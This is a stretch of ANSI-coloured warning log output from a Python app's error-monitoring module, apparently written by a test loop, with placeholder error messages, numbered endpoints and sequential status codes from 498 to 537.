WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843311Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2898'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843362Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2899'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843413Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2900'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843462Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2901'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843512Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2902'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843560Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2903'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843610Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2904'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2905'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843707Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2906'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843755Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2907'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843802Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2908'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.843850Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2909'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844032Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2910'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844085Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2911'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844134Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2912'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844182Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2913'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844230Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2914'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844278Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2915'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844327Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2916'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844375Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2917'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844422Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2918'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844470Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2919'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844517Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2920'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844565Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2921'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844613Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2922'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844660Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2923'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844708Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2924'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844756Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2925'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844804Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2926'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844888Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2927'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.844970Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2928'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845029Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2929'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845081Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2930'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845132Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2931'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845183Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2932'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845234Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2933'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845284Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2934'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845333Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2935'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845382Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2936'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845430Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2937'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
